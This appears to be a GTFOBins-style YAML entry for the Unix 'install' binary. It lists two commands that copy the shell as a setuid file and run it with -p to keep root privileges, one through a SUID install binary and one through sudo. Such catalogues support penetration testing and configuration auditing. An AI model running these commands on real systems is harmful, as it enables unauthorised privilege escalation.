---
functions:
  suid:
    - code: |
        TF=$(mktemp)
        install -m 4755 `which sh` $TF
        $TF -p
  sudo:
    - code: |
        TF=$(mktemp)
        sudo install -m 4755 `which sh` $TF
        $TF -p
---
